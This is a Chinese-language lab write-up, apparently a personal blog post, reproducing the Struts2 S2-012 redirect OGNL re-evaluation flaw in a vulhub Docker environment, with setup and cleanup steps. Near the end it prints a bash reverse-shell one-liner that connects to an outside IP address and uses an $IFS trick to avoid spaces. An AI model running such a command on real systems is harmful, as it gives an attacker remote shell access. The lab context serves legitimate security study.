ailx10说：这篇是我2024年9月写的。S2-012 的关键，在我这次实验里是重定向配置。name 原本像个普通输入，可一旦被放进动态结果里再解析，就多了一次表达式求值的机会。我先试读取和回显，再做连接，把配置和请求放在一起记下来。它让我把“同样是用户输入”往后多追了一步：第一次接收时看着没问题，后面拿去生成跳转地址时又会发生什么。这里不是所有重定向都危险，具体的动态变量和结果类型才是这次练习成立的原因。

---

历史靶场代码和地址未重跑，以下输出仅反映原作者的记录。请在经授权的隔离环境中验证版本、配置、请求字节和结果。

原案例中 redirect result 的动态变量参与再次求值；具体配置是必要前提。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

实验结束后在确认项目目录和 Compose 配置后关闭本项目服务；原文中的全局 Docker 清理命令已移除。

简单访问一下，说明 Struts2 S2-012 远程代码执行漏洞 环境搭建成功了

（2）命令执行，反弹shell

```
/bin/bash -c bash$IFS$9-i>&/dev/tcp/144.34.162.13/6666<&1
```

原实验中的 shell 字符串依赖 IFS、位置参数及命令解析环境；IFS 不一定只有一个空格，具体展开结果需要在隔离环境验证。
